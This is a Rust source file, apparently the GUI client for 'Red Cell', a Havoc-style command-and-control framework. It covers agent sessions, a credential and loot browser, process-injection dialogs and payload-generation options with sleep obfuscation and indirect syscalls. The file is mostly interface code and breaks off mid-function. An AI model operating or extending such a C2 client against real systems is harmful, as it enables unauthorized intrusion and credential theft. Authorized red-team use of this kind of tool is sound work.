mod known_servers;
mod local_config;
mod login;
mod python;
mod transport;

use base64::Engine;
use std::collections::BTreeMap;
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use anyhow::{Result, anyhow};
use clap::Parser;
use eframe::egui::{
    self, Align, Align2, Color32, FontId, Key, Layout, Pos2, Rect, RichText, Sense, Stroke,
};
use known_servers::{KnownServersStore, host_port_from_url};
use local_config::LocalConfig;
use login::{LoginAction, LoginState, render_login_dialog};
use python::{
    PythonRuntime, ScriptDescriptor, ScriptLoadStatus, ScriptOutputEntry, ScriptOutputStream,
    ScriptTabDescriptor,
};
use red_cell_common::demon::DemonCommand;
use red_cell_common::operator::{
    AgentTaskInfo, BuildPayloadRequestInfo, EventCode, FlatInfo, ListenerInfo, Message,
    MessageHead, NameInfo, OperatorMessage,
};
use rfd::FileDialog;
use transport::{
    AgentConsoleEntry, AgentConsoleEntryKind, AgentFileBrowserState, AgentProcessListState,
    AppState, BuildConsoleEntry, ClientTransport, ConnectedOperatorState, ConnectionStatus,
    EventKind, FileBrowserEntry, LootItem, LootKind, PayloadBuildResult, ProcessEntry,
    SharedAppState, TlsVerification,
};
use zeroize::Zeroizing;

const WINDOW_TITLE: &str = "Red Cell Client";
const DEFAULT_SERVER_URL: &str = "wss://127.0.0.1:40056/havoc";
const INITIAL_WINDOW_SIZE: [f32; 2] = [1600.0, 900.0];
const MINIMUM_WINDOW_SIZE: [f32; 2] = [1280.0, 720.0];
const SESSION_GRAPH_HEIGHT: f32 = 280.0;
const SESSION_GRAPH_MIN_ZOOM: f32 = 0.35;
const SESSION_GRAPH_MAX_ZOOM: f32 = 2.5;
const SESSION_GRAPH_ROOT_ID: &str = "__teamserver__";

#[derive(Debug, Clone, Parser, PartialEq, Eq)]
#[command(name = "red-cell-client", about = "Red Cell operator client")]
struct Cli {
    /// Teamserver WebSocket URL.
    #[arg(long, default_value = DEFAULT_SERVER_URL)]
    server: String,
    /// Directory containing client-side Python scripts.
    #[arg(long)]
    scripts_dir: Option<PathBuf>,
    /// Path to a PEM-encoded CA certificate for teamserver verification.
    #[arg(long)]
    ca_cert: Option<PathBuf>,
    /// SHA-256 fingerprint (hex) of the pinned teamserver certificate.
    #[arg(long)]
    cert_fingerprint: Option<String>,
    /// Disable TLS certificate verification entirely. DANGEROUS: makes connections
    /// vulnerable to man-in-the-middle attacks. Prefer --ca-cert or --cert-fingerprint.
    /// Deprecated: TOFU is now the default — this flag will be removed in a future release.
    #[arg(long, default_value_t = false, hide = true)]
    accept_invalid_certs: bool,
    /// Remove a previously trusted server from the known-servers store and exit.
    /// Specify the host:port (e.g. "10.0.0.1:40056") to purge.
    #[arg(long)]
    purge_known_server: Option<String>,
}

/// Application lifecycle phase.
enum AppPhase {
    /// Showing the login dialog, no active transport.
    Login(LoginState),
    /// Transport is active and login message has been sent.
    Authenticating {
        app_state: SharedAppState,
        transport: ClientTransport,
        login_state: LoginState,
    },
    /// Authenticated and showing the main operator UI.
    Connected {
        app_state: SharedAppState,
        #[allow(dead_code)]
        transport: ClientTransport,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AgentSortColumn {
    Id,
    Hostname,
    Username,
    Domain,
    Ip,
    Pid,
    Process,
    Arch,
    Elevated,
    Os,
    SleepJitter,
    LastCheckin,
}

impl AgentSortColumn {
    const ALL: [(Self, &'static str); 12] = [
        (Self::Id, "ID"),
        (Self::Hostname, "Hostname"),
        (Self::Username, "Username"),
        (Self::Domain, "Domain"),
        (Self::Ip, "IP"),
        (Self::Pid, "PID"),
        (Self::Process, "Process"),
        (Self::Arch, "Arch"),
        (Self::Elevated, "Elevated"),
        (Self::Os, "OS"),
        (Self::SleepJitter, "Sleep/Jitter"),
        (Self::LastCheckin, "Last Checkin"),
    ];
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct NoteEditorState {
    agent_id: String,
    note: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum LootTypeFilter {
    #[default]
    All,
    Credentials,
    Files,
    Screenshots,
}

impl LootTypeFilter {
    #[allow(dead_code)]
    const ALL: [(Self, &'static str); 4] = [
        (Self::All, "All"),
        (Self::Credentials, "Credentials"),
        (Self::Files, "Files"),
        (Self::Screenshots, "Screenshots"),
    ];
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum CredentialSubFilter {
    #[default]
    All,
    NtlmHash,
    Plaintext,
    KerberosTicket,
    Certificate,
}

impl CredentialSubFilter {
    const ALL: [(Self, &'static str); 5] = [
        (Self::All, "All"),
        (Self::NtlmHash, "NTLM Hash"),
        (Self::Plaintext, "Plaintext Password"),
        (Self::KerberosTicket, "Kerberos Ticket"),
        (Self::Certificate, "Certificate"),
    ];
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum FileSubFilter {
    #[default]
    All,
    Document,
    Archive,
    Binary,
}

impl FileSubFilter {
    const ALL: [(Self, &'static str); 4] = [
        (Self::All, "All"),
        (Self::Document, "Document"),
        (Self::Archive, "Archive"),
        (Self::Binary, "Binary"),
    ];
}

/// Active sub-tab inside the Loot dock panel.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum LootTab {
    #[default]
    Credentials,
    Screenshots,
    Files,
}

/// Persistent UI state for the Loot panel.
#[derive(Debug, Default)]
struct LootPanelState {
    /// Currently active sub-tab.
    active_tab: LootTab,
    /// Selected screenshot index (into the filtered screenshot list) for detail view.
    selected_screenshot: Option<usize>,
    /// Column used for sorting the credential table.
    cred_sort_column: CredentialSortColumn,
    /// Whether the credential sort is descending.
    cred_sort_desc: bool,
}

/// Columns available for sorting in the credential table.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum CredentialSortColumn {
    #[default]
    Name,
    Agent,
    Category,
    Source,
    Time,
}

#[derive(Debug, Default)]
struct AgentConsoleState {
    input: String,
    history: Vec<String>,
    history_index: Option<usize>,
    completion_index: usize,
    completion_seed: Option<String>,
    status_message: Option<String>,
}

#[derive(Debug, Default)]
struct AgentFileBrowserUiState {
    selected_path: Option<String>,
    pending_dirs: BTreeSet<String>,
    status_message: Option<String>,
}

#[derive(Debug, Default)]
struct AgentProcessPanelState {
    filter: String,
    status_message: Option<String>,
}

#[derive(Debug, Default)]
struct ScriptManagerState {
    selected_script: Option<String>,
    selected_tab: Option<String>,
    status_message: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
struct SessionGraphState {
    pan: egui::Vec2,
    zoom: f32,
}

impl Default for SessionGraphState {
    fn default() -> Self {
        Self { pan: egui::Vec2::ZERO, zoom: 1.0 }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum InjectionTargetAction {
    #[default]
    Inject,
    Migrate,
}

impl InjectionTargetAction {
    fn label(self) -> &'static str {
        match self {
            Self::Inject => "Inject",
            Self::Migrate => "Migrate",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum InjectionTechnique {
    #[default]
    Default,
    CreateRemoteThread,
    NtCreateThreadEx,
    NtQueueApcThread,
}

impl InjectionTechnique {
    const ALL: [(Self, &'static str); 4] = [
        (Self::Default, "Default"),
        (Self::CreateRemoteThread, "CreateRemoteThread"),
        (Self::NtCreateThreadEx, "NtCreateThreadEx"),
        (Self::NtQueueApcThread, "NtQueueApcThread"),
    ];

    fn as_wire_value(self) -> &'static str {
        match self {
            Self::Default => "default",
            Self::CreateRemoteThread => "createremotethread",
            Self::NtCreateThreadEx => "ntcreatethreadex",
            Self::NtQueueApcThread => "ntqueueapcthread",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ProcessInjectionDialogState {
    agent_id: String,
    pid: u32,
    process_name: String,
    arch: String,
    action: InjectionTargetAction,
    technique: InjectionTechnique,
    shellcode_path: String,
    arguments: String,
    status_message: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum ConsoleLayoutMode {
    #[default]
    Tabs,
    Split,
}

impl ConsoleLayoutMode {
    #[allow(dead_code)]
    const ALL: [(Self, &'static str); 2] = [(Self::Tabs, "Tabs"), (Self::Split, "Split")];
}

/// Identifies a tab in the bottom dock panel.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
enum DockTab {
    /// Teamserver chat / event log.
    TeamserverChat,
    /// Listener management panel.
    Listeners,
    /// Session graph visualization.
    SessionGraph,
    /// Python script manager.
    Scripts,
    /// Loot browser.
    Loot,
    /// Per-agent interactive console.
    AgentConsole(String),
    /// Per-agent file explorer (standalone dual-pane browser).
    FileBrowser(String),
    /// Per-agent process list viewer (standalone tab).
    ProcessList(String),
}

impl DockTab {
    /// Display label for the tab.
    fn label(&self) -> String {
        match self {
            Self::TeamserverChat => "Teamserver Chat".to_owned(),
            Self::Listeners => "Listeners".to_owned(),
            Self::SessionGraph => "Session Graph".to_owned(),
            Self::Scripts => "Scripts".to_owned(),
            Self::Loot => "Loot".to_owned(),
            Self::AgentConsole(id) => format!("[{id}]"),
            Self::FileBrowser(id) => format!("[{id}] File Explorer"),
            Self::ProcessList(id) => format!("Process: [{id}]"),
        }
    }

    /// Accent color for the tab's left border (Havoc-style).
    fn accent_color(&self) -> Color32 {
        match self {
            Self::TeamserverChat => Color32::from_rgb(200, 80, 200), // magenta
            Self::Listeners => Color32::from_rgb(80, 180, 220),      // cyan
            Self::SessionGraph => Color32::from_rgb(110, 199, 141),  // green
            Self::Scripts => Color32::from_rgb(232, 182, 83),        // yellow
            Self::Loot => Color32::from_rgb(220, 130, 60),           // orange
            Self::AgentConsole(_) => Color32::from_rgb(140, 120, 220), // purple
            Self::FileBrowser(_) => Color32::from_rgb(80, 180, 140), // teal
            Self::ProcessList(_) => Color32::from_rgb(255, 85, 85),  // red/salmon
        }
    }

    /// Whether this tab can be closed by the user.
    fn closeable(&self) -> bool {
        !matches!(self, Self::TeamserverChat)
    }
}

/// Dock panel state — tracks which tabs are open, which is selected, and the top/bottom split.
#[derive(Debug)]
struct DockState {
    /// Ordered list of open dock tabs.
    open_tabs: Vec<DockTab>,
    /// Currently selected/visible dock tab.
    selected: Option<DockTab>,
    /// Fractional height of the top zone (0.0–1.0, default 0.35).
    #[allow(dead_code)]
    top_fraction: f32,
    /// Whether the event viewer panel (top-right) is visible.
    event_viewer_open: bool,
    /// Fractional width of the session table vs event viewer (0.0–1.0, default 0.6).
    top_split_fraction: f32,
}

impl Default for DockState {
    fn default() -> Self {
        Self {
            open_tabs: vec![DockTab::TeamserverChat],
            selected: Some(DockTab::TeamserverChat),
            top_fraction: 0.35,
            event_viewer_open: true,
            top_split_fraction: 0.6,
        }
    }
}

impl DockState {
    fn open_tab(&mut self, tab: DockTab) {
        if !self.open_tabs.contains(&tab) {
            self.open_tabs.push(tab.clone());
        }
        self.selected = Some(tab);
    }

    fn close_tab(&mut self, tab: &DockTab) {
        self.open_tabs.retain(|t| t != tab);
        if self.selected.as_ref() == Some(tab) {
            self.selected = self.open_tabs.first().cloned();
        }
    }

    fn ensure_selected(&mut self) {
        if self.selected.as_ref().is_some_and(|s| self.open_tabs.contains(s)) {
            return;
        }
        self.selected = self.open_tabs.first().cloned();
    }
}

/// Cache for decoded screenshot textures.  `TextureHandle` does not implement `Debug`,
/// so we provide a manual impl to keep `SessionPanelState` debuggable.
#[derive(Default)]
struct ScreenshotTextureCache {
    inner: std::collections::HashMap<i64, egui::TextureHandle>,
}

impl std::fmt::Debug for ScreenshotTextureCache {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ScreenshotTextureCache").field("count", &self.inner.len()).finish()
    }
}

#[derive(Debug, Default)]
struct SessionPanelState {
    filter: String,
    sort_column: Option<AgentSortColumn>,
    descending: bool,
    open_consoles: Vec<String>,
    selected_console: Option<String>,
    #[allow(dead_code)]
    console_layout: ConsoleLayoutMode,
    console_state: BTreeMap<String, AgentConsoleState>,
    file_browser_state: BTreeMap<String, AgentFileBrowserUiState>,
    process_state: BTreeMap<String, AgentProcessPanelState>,
    note_editor: Option<NoteEditorState>,
    process_injection: Option<ProcessInjectionDialogState>,
    script_manager: ScriptManagerState,
    graph_state: SessionGraphState,
    pending_messages: Vec<OperatorMessage>,
    status_message: Option<String>,
    #[allow(dead_code)]
    loot_type_filter: LootTypeFilter,
    loot_cred_filter: CredentialSubFilter,
    loot_file_filter: FileSubFilter,
    loot_agent_filter: String,
    loot_since_filter: String,
    loot_until_filter: String,
    loot_text_filter: String,
    loot_status_message: Option<String>,
    loot_panel: LootPanelState,
    /// Cache of decoded screenshot textures keyed by loot item id.
    screenshot_textures: ScreenshotTextureCache,
    chat_input: String,
    /// Which event kinds are shown in the notification panel (None = all).
    event_kind_filter: Option<EventKind>,
    /// Selected listener name in the listeners table.
    selected_listener: Option<String>,
    /// Open Create/Edit Listener dialog state (None = dialog closed).
    listener_dialog: Option<ListenerDialogState>,
    /// Open Payload generation dialog state (None = dialog closed).
    payload_dialog: Option<PayloadDialogState>,
    /// Set to true when the "Mark all read" button is pressed; consumed in `render_main_ui`.
    pending_mark_all_read: bool,
    /// Bottom dock panel state.
    dock: DockState,
}

impl SessionPanelState {
    fn toggle_sort(&mut self, column: AgentSortColumn) {
        if self.sort_column == Some(column) {
            self.descending = !self.descending;
        } else {
            self.sort_column = Some(column);
            self.descending = false;
        }
    }

    fn ensure_console_open(&mut self, agent_id: &str) {
        if !self.open_consoles.iter().any(|open_id| open_id == agent_id) {
            self.open_consoles.push(agent_id.to_owned());
        }
        self.selected_console = Some(agent_id.to_owned());
        self.dock.open_tab(DockTab::AgentConsole(agent_id.to_owned()));
    }

    fn ensure_file_browser_open(&mut self, agent_id: &str) {
        self.dock.open_tab(DockTab::FileBrowser(agent_id.to_owned()));
    }

    fn ensure_process_list_open(&mut self, agent_id: &str) {
        self.dock.open_tab(DockTab::ProcessList(agent_id.to_owned()));
    }

    #[allow(dead_code)]
    fn ensure_selected_console(&mut self) {
        if self
            .selected_console
            .as_ref()
            .is_some_and(|selected| self.open_consoles.iter().any(|open_id| open_id == selected))
        {
            return;
        }

        self.selected_console = self.open_consoles.first().cloned();
    }

    fn close_console(&mut self, agent_id: &str) {
        self.open_consoles.retain(|open_id| open_id != agent_id);
        self.console_state.remove(agent_id);
        self.file_browser_state.remove(agent_id);
        self.dock.close_tab(&DockTab::AgentConsole(agent_id.to_owned()));
        if self.selected_console.as_deref() == Some(agent_id) {
            self.selected_console = self.open_consoles.first().cloned();
        }
    }

    fn console_state_mut(&mut self, agent_id: &str) -> &mut AgentConsoleState {
        self.console_state.entry(agent_id.to_owned()).or_default()
    }

    fn file_browser_state_mut(&mut self, agent_id: &str) -> &mut AgentFileBrowserUiState {
        self.file_browser_state.entry(agent_id.to_owned()).or_default()
    }

    fn process_state_mut(&mut self, agent_id: &str) -> &mut AgentProcessPanelState {
        self.process_state.entry(agent_id.to_owned()).or_default()
    }
}

// ── Listener dialog types ───────────────────────────────────────────
/// Listener protocol selection in the Create/Edit dialog.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ListenerProtocol {
    Http,
    Https,
    Smb,
    External,
}

impl ListenerProtocol {
    const ALL: [Self; 4] = [Self::Http, Self::Https, Self::Smb, Self::External];

    fn label(self) -> &'static str {
        match self {
            Self::Http => "Http",
            Self::Https => "Https",
            Self::Smb => "Smb",
            Self::External => "External",
        }
    }
}

/// Whether we are creating a new listener or editing an existing one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ListenerDialogMode {
    Create,
    Edit,
}

/// State for the Create/Edit Listener dialog window.
#[derive(Debug, Clone)]
struct ListenerDialogState {
    mode: ListenerDialogMode,
    name: String,
    protocol: ListenerProtocol,
    // HTTP/HTTPS fields
    host: String,
    port: String,
    user_agent: String,
    headers: String,
    uris: String,
    host_header: String,
    proxy_enabled: bool,
    proxy_type: String,
    proxy_host: String,
    proxy_port: String,
    proxy_username: String,
    proxy_password: Zeroizing<String>,
    // SMB fields
    pipe_name: String,
    // External fields
    endpoint: String,
}

impl ListenerDialogState {
    fn new_create() -> Self {
        Self {
            mode: ListenerDialogMode::Create,
            name: String::new(),
            protocol: ListenerProtocol::Http,
            host: String::new(),
            port: String::new(),
            user_agent: String::new(),
            headers: String::new(),
            uris: String::new(),
            host_header: String::new(),
            proxy_enabled: false,
            proxy_type: "http".to_owned(),
            proxy_host: String::new(),
            proxy_port: String::new(),
            proxy_username: String::new(),
            proxy_password: Zeroizing::new(String::new()),
            pipe_name: String::new(),
            endpoint: String::new(),
        }
    }

    fn new_edit(name: &str, protocol: &str, info: &ListenerInfo) -> Self {
        let protocol_enum = match protocol {
            "Https" => ListenerProtocol::Https,
            "Smb" => ListenerProtocol::Smb,
            "External" => ListenerProtocol::External,
            _ => ListenerProtocol::Http,
        };
        Self {
            mode: ListenerDialogMode::Edit,
            name: name.to_owned(),
            protocol: protocol_enum,
            host: info.host_bind.clone().unwrap_or_default(),
            port: info.port_bind.clone().unwrap_or_default(),
            user_agent: info.user_agent.clone().unwrap_or_default(),
            headers: info.headers.clone().unwrap_or_default(),
            uris: info.uris.clone().unwrap_or_default(),
            host_header: info
                .extra
                .get("HostHeader")
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_owned(),
            proxy_enabled: info.proxy_enabled.as_deref() == Some("true"),
            proxy_type: info.proxy_type.clone().unwrap_or_else(|| "http".to_owned()),
            proxy_host: info.proxy_host.clone().unwrap_or_default(),
            proxy_port: info.proxy_port.clone().unwrap_or_default(),
            proxy_username: info.proxy_username.clone().unwrap_or_default(),
            proxy_password: Zeroizing::new(info.proxy_password.clone().unwrap_or_default()),
            pipe_name: info
                .extra
                .get("PipeName")
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_owned(),
            endpoint: info
                .extra
                .get("Endpoint")
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_owned(),
        }
    }

    /// Build the `ListenerInfo` payload for the WebSocket message.
    fn to_listener_info(&self) -> ListenerInfo {
        let protocol_str = self.protocol.label().to_owned();
        let secure = matches!(self.protocol, ListenerProtocol::Https);
        let mut extra = BTreeMap::new();

        match self.protocol {
            ListenerProtocol::Http | ListenerProtocol::Https => {
                if !self.host_header.is_empty() {
                    extra.insert(
                        "HostHeader".to_owned(),
                        serde_json::Value::String(self.host_header.clone()),
                    );
                }
                ListenerInfo {
                    name: Some(self.name.clone()),
                    protocol: Some(protocol_str),
                    status: Some("Online".to_owned()),
                    host_bind: Some(self.host.clone()),
                    port_bind: Some(self.port.clone()),
                    user_agent: if self.user_agent.is_empty() {
                        None
                    } else {
                        Some(self.user_agent.clone())
                    },
                    headers: if self.headers.is_empty() {
                        None
                    } else {
                        Some(self.headers.clone())
                    },
                    uris: if self.uris.is_empty() { None } else { Some(self.uris.clone()) },
                    secure: Some(secure.to_string()),
                    proxy_enabled: Some(self.proxy_enabled.to_string()),
                    proxy_type: if self.proxy_enabled {
                        Some(self.proxy_type.clone())
                    } else {
                        None
                    },
                    proxy_host: if self.proxy_enabled {
                        Some(self.proxy_host.clone())
                    } else {
                        None
                    },
                    proxy_port: if self.proxy_enabled {
                        Some(self.proxy_port.clone())
                    } else {
                        None
                    },
                    proxy_username: if self.proxy_enabled {
                        Some(self.proxy_username.clone())
                    } else {
                        None
                    },
                    proxy_password: if self.proxy_enabled {
                        Some((*self.proxy_password).clone())
                    } else {
                        None
                    },
                    extra,
                    ..ListenerInfo::default()
                }
            }
            ListenerProtocol::Smb => {
                extra.insert(
                    "PipeName".to_owned(),
                    serde_json::Value::String(self.pipe_name.clone()),
                );
                ListenerInfo {
                    name: Some(self.name.clone()),
                    protocol: Some(protocol_str),
                    status: Some("Online".to_owned()),
                    extra,
                    ..ListenerInfo::default()
                }
            }
            ListenerProtocol::External => {
                extra.insert(
                    "Endpoint".to_owned(),
                    serde_json::Value::String(self.endpoint.clone()),
                );
                ListenerInfo {
                    name: Some(self.name.clone()),
                    protocol: Some(protocol_str),
                    status: Some("Online".to_owned()),
                    extra,
                    ..ListenerInfo::default()
                }
            }
        }
    }
}

// ── Payload dialog types ────────────────────────────────────────────
/// Architecture selection for payload generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PayloadArch {
    X64,
    X86,
}

impl PayloadArch {
    const ALL: [Self; 2] = [Self::X64, Self::X86];

    fn label(self) -> &'static str {
        match self {
            Self::X64 => "x64",
            Self::X86 => "x86",
        }
    }
}

/// Output format for payload generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[allow(clippy::enum_variant_names)]
enum PayloadFormat {
    WindowsExe,
    WindowsServiceExe,
    WindowsDll,
    WindowsReflectiveDll,
    WindowsShellcode,
}

impl PayloadFormat {
    const ALL: [Self; 5] = [
        Self::WindowsExe,
        Self::WindowsServiceExe,
        Self::WindowsDll,
        Self::WindowsReflectiveDll,
        Self::WindowsShellcode,
    ];

    fn label(self) -> &'static str {
        match self {
            Self::WindowsExe => "Windows Exe",
            Self::WindowsServiceExe => "Windows Service Exe",
            Self::WindowsDll => "Windows Dll",
            Self::WindowsReflectiveDll => "Windows Reflective Dll",
            Self::WindowsShellcode => "Windows Shellcode",
        }
    }
}

/// Sleep obfuscation technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SleepTechnique {
    WaitForSingleObjectEx,
    Ekko,
    Zilean,
    None,
}

impl SleepTechnique {
    const ALL: [Self; 4] = [Self::WaitForSingleObjectEx, Self::Ekko, Self::Zilean, Self::None];

    fn label(self) -> &'static str {
        match self {
            Self::WaitForSingleObjectEx => "WaitForSingleObjectEx",
            Self::Ekko => "Ekko",
            Self::Zilean => "Zilean",
            Self::None => "None",
        }
    }
}

/// Allocation method for injection.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AllocMethod {
    NativeSyscall,
    Win32,
}

impl AllocMethod {
    const ALL: [Self; 2] = [Self::NativeSyscall, Self::Win32];

    fn label(self) -> &'static str {
        match self {
            Self::NativeSyscall => "Native/Syscall",
            Self::Win32 => "Win32",
        }
    }
}

/// Execute method for injection.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExecuteMethod {
    NativeSyscall,
    Win32,
}

impl ExecuteMethod {
    const ALL: [Self; 2] = [Self::NativeSyscall, Self::Win32];

    fn label(self) -> &'static str {
        match self {
            Self::NativeSyscall => "Native/Syscall",
            Self::Win32 => "Win32",
        }
    }
}

/// State for the Payload generation dialog (Attack > Payload).
#[derive(Debug, Clone)]
struct PayloadDialogState {
    agent_type: String,
    listener: String,
    arch: PayloadArch,
    format: PayloadFormat,
    // Config
    sleep: String,
    jitter: String,
    indirect_syscall: bool,
    sleep_technique: SleepTechnique,
    // Injection
    alloc: AllocMethod,
    execute: ExecuteMethod,
    spawn64: String,
    spawn32: String,
    /// Whether a build request is currently in flight.
    building: bool,
}

impl PayloadDialogState {
    fn new() -> Self {
        Self {
            agent_type: "Demon".to_owned(),
            listener: String::new(),
            arch: PayloadArch::X64,
            format: PayloadFormat::WindowsExe,
            sleep: "2".to_owned(),
            jitter: "20".to_owned(),
            indirect_syscall: true,
            sleep_technique: SleepTechnique::WaitForSingleObjectEx,
            alloc: AllocMethod::NativeSyscall,
            execute: ExecuteMethod::NativeSyscall,
            spawn64: r"C:\Windows\System32\notepad.exe".to_owned(),
            spawn32: r"C:\Windows\SysWOW64\notepad.exe".to_owned(),
            building: false,
        }
    }

    /// Serialize the config fields into the JSON document expected by the
    /// teamserver's `BuildPayloadRequest.Config` field.
    fn config_json(&self) -> String {
        let config = serde_json::json!({
            "Sleep": self.sleep,
            "Jitter": self.jitter,
            "IndirectSyscall": self.indirect_syscall,
            "SleepTechnique": self.sleep_technique.label(),
            "Alloc": self.alloc.label(),
            "Execute": self.execute.label(),
            "Spawn64": self.spawn64,
            "Spawn32": self.spawn32,
        });
        config.to_string()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum SessionAction {
    OpenConsole(String),
    OpenFileBrowser(String),
    OpenProcessList(String),
    RequestKill(String),
    EditNote { agent_id: String, current_note: String },
}

#[derive(Debug, Clone)]
enum ScriptManagerAction {
    Load(PathBuf),
    Reload(String),
    Unload(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SessionGraphNodeKind {
    Teamserver,
    Agent,
}

#[derive(Debug, Clone, PartialEq)]
struct SessionGraphNode {
    id: String,
    title: String,
    subtitle: String,
    status: String,
    position: Pos2,
    size: egui::Vec2,
    kind: SessionGraphNodeKind,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct SessionGraphEdge {
    from: String,
    to: String,
}

#[derive(Debug, Clone, PartialEq)]
struct SessionGraphLayout {
    nodes: Vec<SessionGraphNode>,
    edges: Vec<SessionGraphEdge>,
}

struct ClientApp {
    phase: AppPhase,
    local_config: LocalConfig,
    known_servers: KnownServersStore,
    cli_server_url: String,
    scripts_dir: Option<PathBuf>,
    tls_verification: TlsVerification,
    session_panel: SessionPanelState,
    outgoing_tx: Option<tokio::sync::mpsc::UnboundedSender<OperatorMessage>>,
    python_runtime: Option<PythonRuntime>,
}

impl ClientApp {
    fn new(cli: Cli) -> Result<Self> {
        let local_config = LocalConfig::load();
        let known_servers = KnownServersStore::load();
        let login_state = LoginState::new(&cli.server, &local_config);
        let tls_verification =
            resolve_tls_verification(&cli, &local_config, &known_servers, &cli.server)?;

        Ok(Self {
            phase: AppPhase::Login(login_state),
            local_config,
            known_servers,
            cli_server_url: cli.server,
            scripts_dir: cli.scripts_dir,
            tls_verification,
            session_panel: SessionPanelState {
                sort_column: Some(AgentSortColumn::LastCheckin),
                descending: true,
                ..SessionPanelState::default()
            },
            outgoing_tx: None,
            python_runtime: None,
        })
    }

    fn snapshot(app_state: &SharedAppState) -> AppState {
        match app_state.lock() {
            Ok(state) => state.clone(),
            Err(poisoned) => poisoned.into_inner().clone(),
        }
    }

    fn handle_login_submit(&mut self, ctx: &egui::Context) {
        let AppPhase::Login(login_state) = &mut self.phase else {
            return;
        };

        login_state.set_connecting();

        let server_url = login_state.server_url.trim().to_owned();

        // Re-resolve TLS verification for the actual server URL the user typed,
        // in case it differs from the CLI default (TOFU is per host:port).
        if let Some(host_port) = host_port_from_url(&server_url) {
            if let Some(entry) = self.known_servers.lookup(&host_port) {
                self.tls_verification = TlsVerification::Fingerprint(entry.fingerprint.clone());
            }
        }
        let app_state = Arc::new(Mutex::new(AppState::new(server_url.clone())));
        let scripts_dir =
            self.scripts_dir.clone().or_else(|| self.local_config.resolved_scripts_dir());
        let python_runtime = scripts_dir.as_ref().and_then(|path| match PythonRuntime::initialize(
            app_state.clone(),
            path.clone(),
        ) {
            Ok(runtime) => Some(runtime),
            Err(error) => {
                tracing::warn!(error = %error, "failed to initialize client python runtime");
                None
            }
        });

        match ClientTransport::spawn(
            server_url.clone(),
            app_state.clone(),
            ctx.clone(),
            python_runtime.clone(),
            self.tls_verification.clone(),
        ) {
            Ok(transport) => {
                let login_message = login_state.build_login_message();
                if let Err(error) = transport.queue_message(login_message) {
                    login_state.set_error(format!("Failed to send login: {error}"));
                    return;
                }
                let outgoing_tx = transport.outgoing_sender();
                if let Some(runtime) = python_runtime.as_ref() {
                    runtime.set_outgoing_sender(outgoing_tx.clone());
                }
                self.outgoing_tx = Some(outgoing_tx);

                self.local_config.server_url = Some(server_url);
                self.local_config.username = Some(login_state.username.trim().to_owned());
                if self.local_config.scripts_dir.is_none() {
                    self.local_config.scripts_dir = scripts_dir.clone();
                }
                self.local_config.save();
                self.python_runtime = python_runtime;

                let login_state_clone = login_state.clone();
                self.phase = AppPhase::Authenticating {
                    app_state,
                    transport,
                    login_state: login_state_clone,
                };
            }
            Err(error) => {
                login_state.set_error(format!("Connection failed: {error}"));
            }
        }
    }

    /// Handle the user trusting (or re-trusting) a server certificate.
    ///
    /// Stores the fingerprint in the known-servers file keyed by host:port,
    /// updates the TLS verification mode to pin against that fingerprint, and
    /// also persists the fingerprint in the legacy per-client config for
    /// backwards compatibility.
    fn handle_trust_certificate(&mut self, fingerprint: String) {
        let server_url = match &self.phase {
            AppPhase::Login(login_state) => login_state.server_url.trim().to_owned(),
            _ => self.cli_server_url.clone(),
        };
        if let Some(host_port) = host_port_from_url(&server_url) {
            self.known_servers.trust(&host_port, &fingerprint, None);
            if let Err(error) = self.known_servers.save() {
                tracing::warn!(
                    %error,
                    "failed to persist certificate trust — \
                     TOFU decision will be lost on next launch",
                );
            }
        }
        // Also keep the legacy global fingerprint for backwards compat.
        self.local_config.cert_fingerprint = Some(fingerprint.clone());
        self.tls_verification = TlsVerification::Fingerprint(fingerprint);
        self.local_config.save();
    }

    fn check_auth_response(&mut self) {
        let (snapshot, error_message) = match &self.phase {
            AppPhase::Authenticating { app_state, .. } => {
                let snap = Self::snapshot(app_state);
                let error = match &snap.connection_status {
                    ConnectionStatus::Error(msg) => Some(msg.clone()),
                    // The transport may overwrite an Error state with Retrying before the
                    // UI gets a chance to observe Error. Fall back to the stored auth error
                    // so the login dialog shows the actual failure reason.
                    // If the server closed without sending an explicit auth error (e.g.
                    // rejected credentials via WebSocket close), use the disconnect reason.
                    ConnectionStatus::Retrying(reason) => {
                        snap.last_auth_error.clone().or_else(|| Some(reason.clone()))
                    }
                    ConnectionStatus::Disconnected => snap.last_auth_error.clone(),
                    _ => None,
                };
                (snap, error)
            }
            _ => return,
        };

        if snapshot.operator_info.is_some() {
            let placeholder =
                AppPhase::Login(LoginState::new(&self.cli_server_url, &self.local_config));
            let old_phase = std::mem::replace(&mut self.phase, placeholder);
            if let AppPhase::Authenticating { app_state, transport, .. } = old_phase {
                self.phase = AppPhase::Connected { app_state, transport };
            }
            return;
        }

        if let Some(error_msg) = error_message {
            let tls_failure = snapshot.tls_failure.clone();
            let placeholder =
